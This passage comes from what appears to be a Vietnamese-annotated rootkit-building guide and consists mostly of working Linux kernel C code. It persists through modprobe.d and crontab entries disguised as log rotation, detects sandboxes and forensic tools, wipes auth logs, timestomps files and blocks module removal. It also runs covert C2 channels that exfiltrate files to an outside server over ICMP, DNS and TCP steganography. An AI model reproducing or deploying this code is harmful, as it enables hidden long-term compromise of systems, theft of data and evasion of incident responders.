    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 6: Infect existing module — Parasitic persistence
 *
 * Stealth: VERY HIGH (no new files)
 * Reliability: MEDIUM (module signature may fail)
 *
 * Modify existing commonly-loaded module's init function
 * để load rootkit module trước khi thực hiện chức năng gốc.
 *
 * Target modules tốt: e1000, virtio_net (network drivers)
 * → Luôn load sớm, essential → admin không disable.
 *
 * Implementation: append insmod command vào module's
 * modprobe.d config instead of modifying binary.
 * ══════════════════════════════════════════════════════════════ */
static void persist_parasitic(const char *module_name,
                               const char *ko_path)
{
    char cmd[1024];

    /* Dùng modprobe.d install directive:
     * "install target_module" thay thế default modprobe behavior.
     * install line can run arbitrary commands THEN load module.
     *
     * Ví dụ: khi hệ thống modprobe e1000 (ethernet driver):
     *   1. modprobe đọc /etc/modprobe.d/e1000.conf
     *   2. Thấy install directive
     *   3. Chạy command: insmod rootkit.ko; modprobe --ignore-install e1000
     *   4. Rootkit loaded TRƯỚC network driver */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        "echo 'install e1000 "
        "/sbin/insmod /lib/modules/'$(uname -r)'/extra/%s.ko 2>/dev/null; "
        "/sbin/modprobe --ignore-install e1000' "
        "> /etc/modprobe.d/e1000.conf",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 7: Crontab — Simple timer-based
 *
 * Stealth: LOW (crontab -l shows it)
 * Reliability: MEDIUM (cron phải chạy)
 *
 * Check mỗi phút nếu module loaded, nếu không → load.
 * Survive rmmod (tự load lại sau 1 phút max).
 * ══════════════════════════════════════════════════════════════ */
static void persist_crontab(const char *module_name,
                             const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        /* Add root crontab entry disguised as log rotation */
        "(crontab -l 2>/dev/null; "
        "echo '* * * * * "
        "lsmod | grep -q %s || /sbin/modprobe %s "
        "# log rotation check') | "
        "sort -u | crontab -",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ── Unified: install multiple persistence layers ── */
void rk_install_persistence(void)
{
    const char *mod_name = THIS_MODULE->name;
    char ko_path[256];

    /* Find current .ko file path.
     * Module file typically at:
     *   /lib/modules/KVER/extra/MODULE.ko
     * But khi dev: có thể ở bất kỳ đâu.
     * Dùng modinfo để find. */
    snprintf(ko_path, sizeof(ko_path),
             "/lib/modules/%s/extra/%s.ko",
             utsname()->release, mod_name);

    /* Install multiple layers cho redundancy */
    persist_systemd_service(mod_name, ko_path);
    persist_modules_load_d(mod_name, ko_path);
    persist_udev_rule(mod_name, ko_path);

    pr_info("rk: persistence installed (3 layers)\n");
}
```

---

## Chapter 13: Anti-Forensics & Self-Protection

```c
/* anti_forensics.c — Chống phân tích và tự bảo vệ
 *
 * 5 categories:
 *   1. VM/Sandbox detection
 *   2. Anti-debugging
 *   3. Log tampering
 *   4. Timestamp manipulation
 *   5. Self-protection (prevent removal)
 */

#include "rootkit.h"
#include <linux/kthread.h>
#include <linux/utsname.h>

/* ══════════════════════════════════════════════════════════════
 * 1. VM & CONTAINER DETECTION
 *
 * Tại sao detect: sandbox = analyst đang phân tích rootkit.
 * Behavior: thay đổi behavior khi phát hiện (không crash/exit
 * vì đó cũng là indicator).
 * ══════════════════════════════════════════════════════════════ */

static bool rk_detect_hypervisor(void)
{
    unsigned int eax, ebx, ecx, edx;

    /* CPUID leaf 1, ECX bit 31 = Hypervisor Present Bit.
     * Nếu = 1 → chạy trong VM.
     * VMware, KVM, Xen, Hyper-V đều set bit này. */
    cpuid(1, &eax, &ebx, &ecx, &edx);
    return (ecx >> 31) & 1;
}

static bool rk_detect_vm_vendor(void)
{
    unsigned int eax, ebx, ecx, edx;
    char vendor[13];

    /* CPUID leaf 0x40000000 = Hypervisor vendor string.
     * Kết quả trong EBX:EDX:ECX (12 bytes). */
    cpuid(0x40000000, &eax, &ebx, &ecx, &edx);
    memcpy(vendor + 0, &ebx, 4);
    memcpy(vendor + 4, &ecx, 4);
    memcpy(vendor + 8, &edx, 4);
    vendor[12] = '\0';

    /* Known vendors:
     *   "VMwareVMware" → VMware
     *   "KVMKVMKVM\0\0\0" → KVM
     *   "Microsoft Hv" → Hyper-V
     *   "XenVMMXenVMM" → Xen
     *   "VBoxVBoxVBox" → VirtualBox
     */
    if (strstr(vendor, "VMware") || strstr(vendor, "KVM") ||
        strstr(vendor, "Microsoft") || strstr(vendor, "Xen") ||
        strstr(vendor, "VBox"))
        return true;

    return false;
}

static bool rk_detect_container(void)
{
    struct file *f;

    /* Docker creates /.dockerenv */
    f = filp_open("/.dockerenv", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        filp_close(f, NULL);
        return true;
    }

    /* Podman/containerd: check cgroup */
    f = filp_open("/proc/1/cgroup", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        char buf[512];
        loff_t pos = 0;
        ssize_t bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos);
        filp_close(f, NULL);

        if (bytes > 0) {
            buf[bytes] = '\0';
            if (strstr(buf, "docker") || strstr(buf, "lxc") ||
                strstr(buf, "kubepods") || strstr(buf, "containerd"))
                return true;
        }
    }

    return false;
}

static bool rk_detect_analysis_tools(void)
{
    struct task_struct *task;
    bool found = false;

    /* Scan process list cho known forensics/analysis tools */
    rcu_read_lock();
    for_each_process(task) {
        if (strcmp(task->comm, "rkhunter") == 0 ||
            strcmp(task->comm, "chkrootkit") == 0 ||
            strcmp(task->comm, "aide") == 0 ||
            strcmp(task->comm, "ossec") == 0 ||
            strcmp(task->comm, "volatility") == 0 ||
            strcmp(task->comm, "lime") == 0 ||
            strcmp(task->comm, "bpftool") == 0 ||
            strcmp(task->comm, "sysdig") == 0 ||
            strcmp(task->comm, "falco") == 0 ||
            strcmp(task->comm, "tracee") == 0 ||
            strcmp(task->comm, "strace") == 0 ||
            strcmp(task->comm, "ltrace") == 0 ||
            strcmp(task->comm, "gdb") == 0) {
            found = true;
            break;
        }
    }
    rcu_read_unlock();

    return found;
}

/* Unified environment check — gọi lúc init */
bool rk_environment_safe(void)
{
    bool vm = rk_detect_hypervisor() || rk_detect_vm_vendor();
    bool container = rk_detect_container();
    bool tools = rk_detect_analysis_tools();

    if (tools) {
        pr_info("rk: analysis tools detected — adjusting behavior\n");
        /* Không exit (đó cũng là indicator).
         * Thay đổi behavior: disable aggressive features,
         * chỉ giữ passive monitoring. */
        return false;
    }

    /* VM = có thể lab, có thể production VM.
     * Nhiều servers chạy trong VM → không nên block.
     * Log nhưng không thay đổi behavior. */
    if (vm)
        pr_info("rk: running in VM\n");
    if (container)
        pr_info("rk: running in container\n");

    return true;
}

/* ══════════════════════════════════════════════════════════════
 * 2. ANTI-DEBUGGING
 *
 * Detect nếu có debugger/tracer attach vào rootkit module.
 * ══════════════════════════════════════════════════════════════ */

static bool rk_detect_kprobes_on_us(void)
{
    /* Check nếu có kprobes registered trên OUR functions.
     * /sys/kernel/debug/kprobes/list chứa all active probes.
     * Nếu ai đặt probe trên rootkit function → đang debug. */
    struct file *f;
    char buf[4096];
    loff_t pos = 0;
    ssize_t bytes;

    f = filp_open("/sys/kernel/debug/kprobes/list", O_RDONLY, 0);
    if (IS_ERR(f)) return false;

    bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos);
    filp_close(f, NULL);

    if (bytes > 0) {
        buf[bytes] = '\0';
        /* Check nếu có probe trên rootkit's module address range.
         * THIS_MODULE->core_layout.base → module start address.
         * THIS_MODULE->core_layout.size → module size. */
        unsigned long mod_start = (unsigned long)THIS_MODULE->core_layout.base;
        unsigned long mod_end   = mod_start + THIS_MODULE->core_layout.size;

        /* Parse mỗi dòng: "ADDR  STATUS  SYMBOL+OFFSET"
         * Nếu ADDR nằm trong module range → probe trên ta. */
        char *line = buf;
        while (line && *line) {
            unsigned long addr;
            if (kstrtoul(line, 16, &addr) == 0) {
                if (addr >= mod_start && addr < mod_end)
                    return true;
            }
            line = strchr(line, '\n');
            if (line) line++;
        }
    }

    return false;
}

static bool rk_timing_check(void)
{
    /* rdtsc timing check: đo time thực hiện code block.
     * Nếu lâu bất thường → breakpoint/single-step active.
     *
     * Normal: ~100-500 cycles
     * With debugger: >10000 cycles (INT3 trap overhead) */
    unsigned long long start, end;
    unsigned int dummy;

    start = __rdtscp(&dummy);

    /* Noop code — measure baseline */
    asm volatile("nop; nop; nop; nop; nop; nop; nop; nop;");
    asm volatile("nop; nop; nop; nop; nop; nop; nop; nop;");

    end = __rdtscp(&dummy);

    return (end - start > 10000);  /* Threshold */
}

/* ══════════════════════════════════════════════════════════════
 * 3. LOG TAMPERING
 * ══════════════════════════════════════════════════════════════ */

static void rk_clear_dmesg(void)
{
    /* Clear kernel ring buffer.
     * dmesg -C equivalent từ kernel. */
    char *argv[] = { "/bin/dmesg", "-C", NULL };
    char *envp[] = { "PATH=/usr/bin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static void rk_clear_auth_logs(void)
{
    char *cmd =
        "truncate -s 0 /var/log/auth.log 2>/dev/null; "
        "truncate -s 0 /var/log/secure 2>/dev/null; "
        "truncate -s 0 /var/log/kern.log 2>/dev/null; "
        "journalctl --vacuum-time=1s 2>/dev/null";

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * 4. TIMESTAMP MANIPULATION — Stomp file timestamps
 * ══════════════════════════════════════════════════════════════ */

static void rk_timestomp(const char *filepath, struct timespec64 *ts)
{
    struct file *f;
    struct inode *inode;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f)) return;

    inode = file_inode(f);
    if (inode) {
        /* Modify inode timestamps trực tiếp.
         * atime = last access
         * mtime = last modification
         * ctime = last status change (cannot be set via utimensat,
         *         nhưng kernel code CAN modify trực tiếp) */
        inode->i_atime = *ts;
        inode->i_mtime = *ts;
        inode->i_ctime = *ts;

        /* Mark inode dirty để filesystem write changes. */
        mark_inode_dirty(inode);
    }

    filp_close(f, NULL);
}

/* Stomp rootkit files tới match timestamp của /bin/ls */
static void rk_timestomp_rootkit_files(void)
{
    struct file *ref;
    struct inode *ref_inode;
    struct timespec64 ts;

    /* Lấy timestamp reference từ /bin/ls (file hệ thống cũ) */
    ref = filp_open("/bin/ls", O_RDONLY, 0);
    if (IS_ERR(ref)) return;

    ref_inode = file_inode(ref);
    if (ref_inode) {
        ts = ref_inode->i_mtime;

        /* Stomp rootkit files */
        rk_timestomp("/lib/modules/" UTS_RELEASE "/extra/rk.ko", &ts);
        rk_timestomp("/etc/modules-load.d/rk.conf", &ts);
    }

    filp_close(ref, NULL);
}

/* ══════════════════════════════════════════════════════════════
 * 5. SELF-PROTECTION — Prevent removal
 * ══════════════════════════════════════════════════════════════ */

/* Watchdog thread: kiểm tra rootkit integrity.
 * Nếu hooks bị removed → reinstall.
 * Nếu rootkit files bị xóa → recreate.
 * Nếu persistence bị xóa → reinstall. */
static struct task_struct *watchdog = NULL;

static int watchdog_fn(void *data)
{
    while (!kthread_should_stop()) {
        /* Check 1: hooks vẫn intact */
        /* (Verify syscall table entries vẫn trỏ tới hook functions) */

        /* Check 2: module vẫn trong memory */

        /* Check 3: persistence files tồn tại */
        struct file *f;
        f = filp_open("/etc/modules-load.d/rk.conf", O_RDONLY, 0);
        if (IS_ERR(f)) {
            /* Persistence bị xóa → reinstall */
            rk_install_persistence();
        } else {
            filp_close(f, NULL);
        }

        /* Sleep 30 giây rồi check lại.
         * schedule_timeout_interruptible: sleep nhưng có thể bị
         * wakeup bởi signal (kthread_stop gửi signal). */
        schedule_timeout_interruptible(30 * HZ);
    }
    return 0;
}

void rk_start_watchdog(void)
{
    /* Thread name disguised: "kworker/0:1" looks like kernel worker.
     * Real kworkers: kworker/CPU:ID.
     * Forensics detection: check /proc/PID/stack — rootkit thread
     * has unusual stack (schedule_timeout_interruptible in watchdog_fn
     * vs real kworker in worker_thread→process_one_work). */
    watchdog = kthread_run(watchdog_fn, NULL, "kworker/0:1");
    if (IS_ERR(watchdog))
        watchdog = NULL;
}

void rk_stop_watchdog(void)
{
    if (watchdog) {
        kthread_stop(watchdog);
        watchdog = NULL;
    }
}

/* Block rmmod qua delete_module hook.
 * (Hooked via ftrace/syscall table — Chapter 3/4 methods) */
static asmlinkage long (*orig_delete_module)(const struct pt_regs *);

static asmlinkage long hooked_delete_module(const struct pt_regs *regs)
{
    char __user *name_user = (char __user *)regs->di;
    char name[MODULE_NAME_LEN];

    if (strncpy_from_user(name, name_user, MODULE_NAME_LEN) > 0) {
        if (strstr(name, THIS_MODULE->name)) {
            /* Block removal — return EBUSY (device busy) */
            return -EBUSY;
        }
    }
    return orig_delete_module(regs);
}
```

---

## Chapter 14: Covert Communication & C2

```c
/* covert_channel.c — Covert communication channels
 *
 * 6 implementations:
 *   1. ICMP tunnel (data in ping payload)
 *   2. DNS tunnel (data in DNS query subdomain)
 *   3. TCP steganography (data in sequence numbers)
 *   4. Passive listener (zero outbound traffic, data in TCP timestamps)
 *   5. ICMP/DNS C2 receive (inbound command reception)
 *   6. Encrypted C2 (ChaCha20-Poly1305 AEAD)
 */

#include "rootkit.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <net/ip.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/ftrace.h>
#include <crypto/aead.h>
#include <linux/random.h>

/* ══════════════════════════════════════════════════════════════
 * 1. ICMP TUNNEL — Hide data in ping packets
 *
 * Concept:
 *   Normal ICMP Echo Request/Reply carry payload data.
 *   ping -s 1400 sends 1400 bytes payload = legitimate.
 *   Rootkit encode data (stolen creds, file contents) trong payload.
 *
 * Giống traffic bình thường:
 *   - Firewall cho qua ICMP (thường)
 *   - IDS thấy "ping" → low priority
 *   - Payload size biến thiên → hard to signature
 *
 * Implementation:
 *   Outbound: rootkit tạo ICMP Echo Request với data trong payload.
 *   Inbound:  C2 server reply trong ICMP Echo Reply.
 *
 * Used by: nhiều APT tools, icmpsh, icmptunnel projects.
 * ══════════════════════════════════════════════════════════════ */

#define ICMP_MAGIC_ID  0x1337   /* ICMP identifier field cho channel */
#define MAX_ICMP_DATA  1400     /* Max payload per packet */

/* Build và send ICMP packet từ kernel space */
static int rk_send_icmp_data(__be32 dest_ip,
                              const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg = { 0 };
    struct kvec iov;
    int total_len;
    char *packet;
    struct icmphdr *icmp;
    int ret;

    /* Create raw socket cho ICMP */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW,
                            IPPROTO_ICMP, &sock);
    if (ret < 0) return ret;

    /* Build ICMP packet */
    total_len = sizeof(struct icmphdr) + data_len;
    packet = kzalloc(total_len, GFP_KERNEL);
    if (!packet) {
        sock_release(sock);
        return -ENOMEM;
    }

    icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;           /* Echo Request */
    icmp->code = 0;
    icmp->un.echo.id = htons(ICMP_MAGIC_ID);
    icmp->un.echo.sequence = htons(0);

    /* Copy data vào payload */
    memcpy(packet + sizeof(struct icmphdr), data, data_len);

    /* Calculate checksum.
     * ICMP checksum covers entire ICMP message (header + data).
     * ip_compute_csum = one's complement checksum. */
    icmp->checksum = 0;
    icmp->checksum = ip_compute_csum(packet, total_len);

    /* Send */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dest_ip;

    iov.iov_base = packet;
    iov.iov_len = total_len;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    ret = kernel_sendmsg(sock, &msg, &iov, 1, total_len);

    kfree(packet);
    sock_release(sock);
    return ret;
}

/* Exfiltrate file qua ICMP tunnel — chunk by chunk */
static int rk_icmp_exfil_file(__be32 c2_ip, const char *filepath)
{
    struct file *f;
    char *buf;
    loff_t pos = 0;
    ssize_t bytes;
    int seq = 0;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f)) return -1;

    buf = kzalloc(MAX_ICMP_DATA, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return -ENOMEM; }

    while ((bytes = kernel_read(f, buf, MAX_ICMP_DATA, &pos)) > 0) {
        rk_send_icmp_data(c2_ip, buf, bytes);

        /* Delay between packets → avoid burst detection.
         * Random-ish delay: 50-200ms. */
        msleep(50 + (seq % 150));
        seq++;
    }

    /* Send empty packet = EOF marker */
    rk_send_icmp_data(c2_ip, "", 0);

    kfree(buf);
    filp_close(f, NULL);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * 2. DNS TUNNEL — Encode data in DNS queries
 *
 * Concept:
 *   DNS traffic is almost NEVER blocked.
 *   Data encoded as subdomain labels:
 *     <hex_data>.c2domain.com
 *
 *   C2 server = authoritative DNS server cho c2domain.com
 *   → nhận mọi query cho *.c2domain.com
 *   → decode subdomain = exfiltrated data
 *   → respond trong DNS TXT record = commands
 *
 * Ưu điểm:
 *   - DNS luôn được allow (essential service)
 *   - Đi qua proxy/firewall
 *   - Low bandwidth nhưng stealth cao
 *
 * Used by: BPFDoor (DNS resolve cho C2), SUNBURST (famous),
 *          DNScat2, iodine (open-source tools).
 * ══════════════════════════════════════════════════════════════ */

#define DNS_PORT         53
#define DNS_MAX_LABEL    63    /* Max DNS label length */
#define DNS_MAX_NAME     253   /* Max DNS name length */

/* DNS Header structure */
struct dns_header {
    __be16 id;
    __be16 flags;
    __be16 qdcount;
    __be16 ancount;
    __be16 nscount;
    __be16 arcount;
} __attribute__((packed));

/* Hex encode data thành DNS-safe string */
static int hex_encode(const void *data, int data_len,
                       char *out, int out_len)
{
    const unsigned char *p = data;
    int i, written = 0;
    static const char hex[] = "0123456789abcdef";

    for (i = 0; i < data_len && written + 2 < out_len; i++) {
        out[written++] = hex[p[i] >> 4];
        out[written++] = hex[p[i] & 0x0f];
    }
    out[written] = '\0';
    return written;
}

/* Build DNS query packet */
static int build_dns_query(const char *domain, char *packet, int max_len)
{
    struct dns_header *hdr = (struct dns_header *)packet;
    char *qname;
    int offset;
    const char *p;
    int label_len;

    if (max_len < sizeof(*hdr) + strlen(domain) + 6)
        return -1;

    /* Header */
    memset(hdr, 0, sizeof(*hdr));
    hdr->id = htons(0x1234);         /* Transaction ID */
    hdr->flags = htons(0x0100);      /* Standard query, recursion desired */
    hdr->qdcount = htons(1);         /* 1 question */

    /* Encode domain name.
     * DNS encoding: each label prefixed with length byte.
     * "data.evil.com" → \x04data\x04evil\x03com\x00
     */
    qname = packet + sizeof(*hdr);
    offset = 0;
    p = domain;

    while (*p) {
        const char *dot = strchr(p, '.');
        if (!dot) dot = p + strlen(p);

        label_len = dot - p;
        if (label_len > DNS_MAX_LABEL) label_len = DNS_MAX_LABEL;

        qname[offset++] = label_len;
        memcpy(qname + offset, p, label_len);
        offset += label_len;

        p = (*dot) ? dot + 1 : dot;
    }
    qname[offset++] = 0;  /* Root label terminator */

    /* Query type: A (1) and class: IN (1) */
    qname[offset++] = 0; qname[offset++] = 1;   /* Type A */
    qname[offset++] = 0; qname[offset++] = 1;   /* Class IN */

    return sizeof(*hdr) + offset;
}

/* Send DNS query = data exfiltration */
static int rk_dns_exfil(__be32 dns_server,
                          const char *c2_domain,
                          const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg = { 0 };
    struct kvec iov;
    char hex_data[512];
    char query_domain[DNS_MAX_NAME];
    char packet[512];
    int pkt_len, ret;

    /* Hex encode data */
    hex_encode(data, data_len, hex_data, sizeof(hex_data));

    /* Build query domain: <hex_data>.c2domain.com
     * Split hex data into DNS labels (max 63 chars each) */
    if (strlen(hex_data) <= DNS_MAX_LABEL) {
        snprintf(query_domain, sizeof(query_domain),
                 "%s.%s", hex_data, c2_domain);
    } else {
        /* Split into multiple labels */
        char label1[DNS_MAX_LABEL + 1], label2[DNS_MAX_LABEL + 1];
        strncpy(label1, hex_data, DNS_MAX_LABEL);
        label1[DNS_MAX_LABEL] = '\0';
        strncpy(label2, hex_data + DNS_MAX_LABEL, DNS_MAX_LABEL);
        label2[DNS_MAX_LABEL] = '\0';
        snprintf(query_domain, sizeof(query_domain),
                 "%s.%s.%s", label1, label2, c2_domain);
    }

    /* Build DNS packet */
    pkt_len = build_dns_query(query_domain, packet, sizeof(packet));
    if (pkt_len < 0) return -1;

    /* Send via UDP */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM,
                            IPPROTO_UDP, &sock);
    if (ret < 0) return ret;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DNS_PORT);
    addr.sin_addr.s_addr = dns_server;

    iov.iov_base = packet;
    iov.iov_len = pkt_len;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    ret = kernel_sendmsg(sock, &msg, &iov, 1, pkt_len);

    sock_release(sock);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * 3. TCP STEGANOGRAPHY — Data in TCP sequence numbers
 *
 * Concept:
 *   TCP Initial Sequence Number (ISN) thường random (RFC).
 *   Rootkit encode 4 bytes data trong ISN của SYN packet.
 *
 *   C2 server nhận SYN → extract ISN → decode data.
 *   Connection có thể RST ngay → looks like port scan.
 *
 *   Bandwidth: 4 bytes per SYN packet. Slow nhưng very stealthy.
 *
 * Advanced variant:
 *   Dùng TCP timestamp option (10 bytes per packet).
 *   Hoặc: urgent pointer + data.
 *   Hoặc: IP identification field (2 bytes per packet).
 *
 * Implementation:
 *   Hook secure_tcp_seq (hoặc tcp_v4_init_sequence trên kernel cũ)
 *   via ftrace. Khi có pending stego data, override ISN return value.
 * ══════════════════════════════════════════════════════════════ */

static __u32 pending_stego_isn = 0;
static bool  stego_isn_pending = false;
static DEFINE_SPINLOCK(stego_lock);

static u32 (*orig_secure_tcp_seq)(const struct iphdr *, const struct tcphdr *);
static struct ftrace_ops stego_ftrace_ops;

/* Ftrace callback: intercept secure_tcp_seq and override ISN */
static void notrace stego_ftrace_callback(unsigned long ip,
                                            unsigned long parent_ip,
                                            struct ftrace_ops *ops,
                                            struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    unsigned long flags;

    if (!regs) return;

    spin_lock_irqsave(&stego_lock, flags);
    if (stego_isn_pending) {
        /* Override return value: ISN = our encoded data.
         * regs_set_return_value sets RAX. */
        regs_set_return_value(regs, pending_stego_isn);
        stego_isn_pending = false;
        spin_unlock_irqrestore(&stego_lock, flags);

        /* Skip original function by modifying IP */
        instruction_pointer_set(regs,
            (unsigned long)orig_secure_tcp_seq);
        return;
    }
    spin_unlock_irqrestore(&stego_lock, flags);
}

static int stego_hook_install(void)
{
    int ret;
    const char *target = "secure_tcp_seq";

    orig_secure_tcp_seq = (void *)rk_lookup_name(target);
    if (!orig_secure_tcp_seq) {
        /* Fallback: try older name */
        target = "tcp_v4_init_sequence";
        orig_secure_tcp_seq = (void *)rk_lookup_name(target);
        if (!orig_secure_tcp_seq)
            return -ENOENT;
    }

    stego_ftrace_ops.func = stego_ftrace_callback;
    stego_ftrace_ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                              FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter(&stego_ftrace_ops, target,
                             strlen(target), 0);
    if (ret) return ret;

    ret = register_ftrace_function(&stego_ftrace_ops);
    return ret;
}

static void stego_hook_remove(void)
{
    unregister_ftrace_function(&stego_ftrace_ops);
}

/* Send data via TCP ISN steganography.
 *
 * Usage:
 *   1. Set pending_stego_isn = encoded data
 *   2. Connect → kernel calls secure_tcp_seq → hook returns our ISN
 *   3. C2 extracts ISN from received SYN packet */
static int rk_tcp_stego_send(__be32 dest_ip, __be16 dest_port,
                               __u32 encoded_data)
{
    struct socket *sock;
    struct sockaddr_in addr;
    unsigned long flags;
    int ret;

    /* Set pending ISN */
    spin_lock_irqsave(&stego_lock, flags);
    pending_stego_isn = encoded_data ^ 0x5A5A5A5A;
    stego_isn_pending = true;
    spin_unlock_irqrestore(&stego_lock, flags);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &sock);
    if (ret < 0) {
        stego_isn_pending = false;
        return ret;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dest_ip;
    addr.sin_port = dest_port;

    /* Non-blocking connect — gửi SYN rồi close.
     * Mục đích chỉ là gửi SYN có encoded ISN. */
    sock->sk->sk_sndtimeo = msecs_to_jiffies(100);
    kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), O_NONBLOCK);

    /* Close ngay — RST packet sent */
    sock_release(sock);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * 4. PASSIVE LISTENER — Zero outbound traffic
 *
 * Concept (BPFDoor pattern):
 *   Rootkit KHÔNG gửi bất kỳ traffic nào ra ngoài.
 *   Đợi inbound magic packet → activate on demand.
 *   Hoàn toàn invisible cho network monitoring.
 *
 * Trick: sửa response packets của legitimate services
 * để embed data. Ví dụ: HTTP server response header
 * có thêm custom header chứa stolen data.
 *
 * Netfilter POST_ROUTING hook:
 *   Intercept outgoing packets → inject data.
 *
 * Implementation:
 *   skb_ensure_writable MUST be called BEFORE deriving any header
 *   pointers. After ensure_writable, skb->data may have been
 *   reallocated — all old pointers (ip_hdr, tcp_hdr) are stale.
 *   Re-derive ALL pointers after the call.
 * ══════════════════════════════════════════════════════════════ */

static char exfil_queue[4096];
static int  exfil_queue_len = 0;
static DEFINE_SPINLOCK(exfil_lock);

/* Queue data for passive exfiltration */
static void rk_queue_exfil(const void *data, int len)
{
    unsigned long flags;
    spin_lock_irqsave(&exfil_lock, flags);
    if (exfil_queue_len + len <= sizeof(exfil_queue)) {
        memcpy(exfil_queue + exfil_queue_len, data, len);
        exfil_queue_len += len;
    }
    spin_unlock_irqrestore(&exfil_lock, flags);
}

static unsigned int nf_passive_exfil(void *priv,
                                      struct sk_buff *skb,
                                      const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct tcphdr *tcph;
    unsigned char *tcp_opts;
    int opt_len, i;
    unsigned long flags;
    __be32 embed_val;

    if (!skb) return NF_ACCEPT;

    /* Step 1: Make skb writable BEFORE any pointer derivation.
     * skb_ensure_writable may reallocate skb->data, making
     * any previously-derived pointers stale and dangerous. */
    if (skb_ensure_writable(skb, skb->len) != 0)
        return NF_ACCEPT;

    /* Step 2: Derive ALL pointers AFTER ensure_writable.
     * skb->data may have been reallocated. */
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    tcph = tcp_hdr(skb);
    if (!tcph) return NF_ACCEPT;

    /* Chỉ modify packets từ HTTP server (port 80/443) */
    if (ntohs(tcph->source) != 80 && ntohs(tcph->source) != 443)
        return NF_ACCEPT;

    /* Step 3: Check exfil queue */
    spin_lock_irqsave(&exfil_lock, flags);
    if (exfil_queue_len < 4) {
        spin_unlock_irqrestore(&exfil_lock, flags);
        return NF_ACCEPT;
    }
    memcpy(&embed_val, exfil_queue, 4);
    memmove(exfil_queue, exfil_queue + 4, exfil_queue_len - 4);
    exfil_queue_len -= 4;
    spin_unlock_irqrestore(&exfil_lock, flags);

    /* Step 4: Find and modify TCP timestamp option.
     *
     * TCP options nằm sau TCP header:
     *   offset = tcp->doff * 4 (data offset)
     *   options bytes = doff*4 - 20 (20 = min TCP header)
     *
     * Timestamp option (kind 8):
     *   [kind=8][length=10][TSval(4)][TSecr(4)]
     *   Modify TSecr lower bits → embed data.
     */
    opt_len = (tcph->doff * 4) - sizeof(struct tcphdr);
    if (opt_len <= 0) return NF_ACCEPT;
    tcp_opts = (unsigned char *)(tcph + 1);

    for (i = 0; i < opt_len; ) {
        unsigned char kind = tcp_opts[i];
        if (kind == 0) break;
        if (kind == 1) { i++; continue; }
        if (i + 1 >= opt_len) break;
        unsigned char len = tcp_opts[i + 1];
        if (len < 2 || i + len > opt_len) break;

        if (kind == 8 && len == 10) {
            /* Step 5: Embed data (skb already writable) */
            memcpy(&tcp_opts[i + 6], &embed_val, 4);

            /* Step 6: Recalculate TCP checksum */
            int tcp_len = skb->len - ip_hdrlen(skb);
            tcph->check = 0;
            tcph->check = csum_tcpudp_magic(
                iph->saddr, iph->daddr,
                tcp_len, IPPROTO_TCP,
                csum_partial((char *)tcph, tcp_len, 0));
            break;
        }
        i += len;
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops nf_exfil_ops = {
    .hook     = nf_passive_exfil,
    .pf       = PF_INET,
    .hooknum  = NF_INET_POST_ROUTING,
    .priority = NF_IP_PRI_LAST,
};

/* ══════════════════════════════════════════════════════════════
 * 5. ICMP/DNS C2 RECEIVE — Inbound command reception
 *
 * C2 = bidirectional: send data OUT + receive commands IN.
